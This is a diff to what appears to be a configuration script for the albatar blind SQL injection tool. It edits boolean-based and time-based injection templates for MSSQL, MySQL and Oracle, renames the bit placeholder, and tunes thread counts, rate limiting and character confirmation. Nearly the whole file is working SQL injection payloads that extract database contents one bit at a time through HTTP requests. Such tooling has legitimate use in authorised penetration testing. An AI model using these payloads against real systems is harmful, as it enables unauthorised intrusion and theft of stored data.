@@ -2,7 +2,7 @@
 
 from albatar import *
 
-PROXIES = '' # {'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
+PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
 HEADERS = ['User-Agent: Mozilla/5.0']
 
 def test_state_grep(headers, body, time):
@@ -23,7 +23,7 @@ def quote(s):
 
 def mssql_boolean():
 
-  template = " and 1=(select case when ((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_pos})=${bit_pos}) then 1 else 0 end)"
+  template = " and 1=(select case when ((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) then 1 else 0 end)"
 
   def make_requester():
     return Requester_HTTP(
@@ -35,11 +35,11 @@ def mssql_boolean():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template, num_threads=7)
+  return Method_bitwise(make_requester, template)
 
 def mssql_time():
 
-  template = " if((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_pos})=${bit_pos}) waitfor delay '0:0:2'--"
+  template = " if((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) waitfor delay '0:0:2'--"
 
   def make_requester():
     return Requester_HTTP(
@@ -51,11 +51,11 @@ def mssql_time():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template, num_threads=7)
+  return Method_bitwise(make_requester, template, num_threads=1)
 
 def mysql_boolean():
 
-  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}'
+  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
 
   def make_requester():
     return Requester_HTTP(
@@ -67,11 +67,11 @@ def mysql_boolean():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template, num_threads=7)
+  return Method_bitwise(make_requester, template)
 
 def mysql_time():
 
-  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_pos})=${bit_pos}),sleep(1),1)'
+  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}),sleep(1),1)'
 
   def make_requester():
     return Requester_HTTP(
@@ -87,7 +87,7 @@ def mysql_time():
 
 def oracle_boolean():
 
-  template = " AND 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_pos}) from dual)=${bit_pos} then 1 else 0 end from dual)"
+  template = " AND 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_mask}) from dual)=${bit_mask} then 1 else 0 end from dual)"
 
   def make_requester():
     return Requester_HTTP(
@@ -99,7 +99,7 @@ def oracle_boolean():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template, num_threads=1)
+  return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5, confirm_char=True)
 
 #sqli = MSSQL_Blind(mssql_boolean())
 #sqli = MSSQL_Blind(mssql_time())
